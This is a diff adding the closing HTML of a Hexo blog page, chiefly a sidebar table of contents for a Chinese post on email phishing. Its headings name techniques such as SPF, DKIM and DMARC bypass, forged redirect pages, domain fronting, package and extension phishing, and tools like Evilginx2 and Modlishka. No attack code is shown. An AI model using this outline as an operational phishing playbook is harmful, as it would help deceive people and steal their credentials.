+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://127.0.0.1:43110/1FjjU3hdMHVqDkMjMLVvf4syh39JhnK51c/" target="_blank" title="zeronet">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  zeronet
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#邮件钓鱼"><span class="nav-number">1.</span> <span class="nav-text">邮件钓鱼</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼邮件案例分析一"><span class="nav-number">1.1.</span> <span class="nav-text">钓鱼邮件案例分析一</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#星展银行-垃圾邮件案例"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">星展银行 - 垃圾邮件案例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#伪冒的PDF汇款信息文件"><span class="nav-number">1.1.0.1.1.</span> <span class="nav-text">伪冒的PDF汇款信息文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Sender-IP-Address-来自于美国"><span class="nav-number">1.1.0.1.2.</span> <span class="nav-text">Sender IP Address 来自于美国</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#E-mail-Header-Received"><span class="nav-number">1.1.0.1.3.</span> <span class="nav-text">E-mail Header/Received</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼邮件案例分析二"><span class="nav-number">1.2.</span> <span class="nav-text">钓鱼邮件案例分析二</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#APT28"><span class="nav-number">1.2.1.</span> <span class="nav-text">APT28</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼邮件案例分析三"><span class="nav-number">1.3.</span> <span class="nav-text">钓鱼邮件案例分析三</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SectorA05"><span class="nav-number">1.3.1.</span> <span class="nav-text">SectorA05</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼邮件案例分析四"><span class="nav-number">1.4.</span> <span class="nav-text">钓鱼邮件案例分析四</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Azure-Blob存储"><span class="nav-number">1.4.1.</span> <span class="nav-text">Azure Blob存储</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼邮件案例分析五"><span class="nav-number">1.5.</span> <span class="nav-text">钓鱼邮件案例分析五</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Office-365-Activities-API-调查电子邮件攻击行为"><span class="nav-number">1.5.1.</span> <span class="nav-text">使用Office 365 Activities API 调查电子邮件攻击行为</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼方法扩展"><span class="nav-number">1.6.</span> <span class="nav-text">钓鱼方法扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-Basic认证"><span class="nav-number">1.6.1.</span> <span class="nav-text">HTTP Basic认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用OAuth实施钓鱼"><span class="nav-number">1.6.2.</span> <span class="nav-text">利用OAuth实施钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe框架钓鱼行为"><span class="nav-number">1.6.3.</span> <span class="nav-text">iframe框架钓鱼行为</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Azure"><span class="nav-number">1.6.4.</span> <span class="nav-text">Azure</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前期钓鱼邮件部署"><span class="nav-number">1.7.</span> <span class="nav-text">前期钓鱼邮件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置SPF"><span class="nav-number">1.7.1.</span> <span class="nav-text">设置SPF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置DKIM"><span class="nav-number">1.7.2.</span> <span class="nav-text">设置DKIM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置DMARC"><span class="nav-number">1.7.3.</span> <span class="nav-text">设置DMARC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置PTR"><span class="nav-number">1.7.4.</span> <span class="nav-text">设置PTR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#发信"><span class="nav-number">1.7.5.</span> <span class="nav-text">发信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SPF绕过"><span class="nav-number">1.7.6.</span> <span class="nav-text">SPF绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DKIM绕过"><span class="nav-number">1.7.7.</span> <span class="nav-text">DKIM绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DMARC绕过"><span class="nav-number">1.7.8.</span> <span class="nav-text">DMARC绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#中期钓鱼邮件部署"><span class="nav-number">1.8.</span> <span class="nav-text">中期钓鱼邮件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造链接"><span class="nav-number">1.8.1.</span> <span class="nav-text">伪造链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造跳转页"><span class="nav-number">1.8.2.</span> <span class="nav-text">伪造跳转页</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后期钓鱼邮件部署"><span class="nav-number">1.9.</span> <span class="nav-text">后期钓鱼邮件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持"><span class="nav-number">1.9.1.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#钓鱼工具推荐"><span class="nav-number">1.10.</span> <span class="nav-text">钓鱼工具推荐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Evilginx2"><span class="nav-number">1.10.1.</span> <span class="nav-text">Evilginx2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blackeye"><span class="nav-number">1.10.2.</span> <span class="nav-text">Blackeye</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ISeeYou"><span class="nav-number">1.10.3.</span> <span class="nav-text">ISeeYou</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ReelPhish"><span class="nav-number">1.10.4.</span> <span class="nav-text">ReelPhish</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EvilURL"><span class="nav-number">1.10.5.</span> <span class="nav-text">EvilURL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#King-Phisher"><span class="nav-number">1.10.6.</span> <span class="nav-text">King-Phisher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PhEmail"><span class="nav-number">1.10.7.</span> <span class="nav-text">PhEmail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Credsleaker"><span class="nav-number">1.10.8.</span> <span class="nav-text">Credsleaker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FiercePhish"><span class="nav-number">1.10.9.</span> <span class="nav-text">FiercePhish</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleEmailSpoofer"><span class="nav-number">1.10.10.</span> <span class="nav-text">SimpleEmailSpoofer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Modlishka"><span class="nav-number">1.10.11.</span> <span class="nav-text">Modlishka</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SET"><span class="nav-number">1.10.12.</span> <span class="nav-text">SET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Swaks"><span class="nav-number">1.10.13.</span> <span class="nav-text">Swaks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在线工具"><span class="nav-number">1.10.14.</span> <span class="nav-text">在线工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏信息"><span class="nav-number">1.11.</span> <span class="nav-text">隐藏信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏服务器信息"><span class="nav-number">1.11.1.</span> <span class="nav-text">隐藏服务器信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域名前置"><span class="nav-number">1.11.2.</span> <span class="nav-text">域名前置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏邮件服务器信息"><span class="nav-number">1.11.3.</span> <span class="nav-text">隐藏邮件服务器信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新型钓鱼方法"><span class="nav-number">1.12.</span> <span class="nav-text">新型钓鱼方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#USB钓鱼"><span class="nav-number">1.12.1.</span> <span class="nav-text">USB钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全屏API"><span class="nav-number">1.12.2.</span> <span class="nav-text">全屏API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PhishPoint绕过office-365保护"><span class="nav-number">1.12.3.</span> <span class="nav-text">PhishPoint绕过office 365保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MAM快捷方式钓鱼"><span class="nav-number">1.12.4.</span> <span class="nav-text">MAM快捷方式钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用TLS网络钓鱼"><span class="nav-number">1.12.5.</span> <span class="nav-text">利用TLS网络钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-Package-钓鱼"><span class="nav-number">1.12.6.</span> <span class="nav-text">Python Package 钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VSCODE-EXTENSION-钓鱼"><span class="nav-number">1.12.7.</span> <span class="nav-text">VSCODE EXTENSION 钓鱼</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地测试过程记录"><span class="nav-number">1.13.</span> <span class="nav-text">本地测试过程记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-搭建钓鱼EC2服务器"><span class="nav-number">1.13.1.</span> <span class="nav-text">0x01 搭建钓鱼EC2服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-搭建邮件服务器"><span class="nav-number">1.13.2.</span> <span class="nav-text">0x02 搭建邮件服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#搭建本地邮件服务器"><span class="nav-number">1.13.2.1.</span> <span class="nav-text">搭建本地邮件服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在线邮箱服务"><span class="nav-number">1.13.2.2.</span> <span class="nav-text">在线邮箱服务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战过程记录"><span class="nav-number">1.14.</span> <span class="nav-text">实战过程记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.15.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<!--  
+-->
+</body>
+</html>
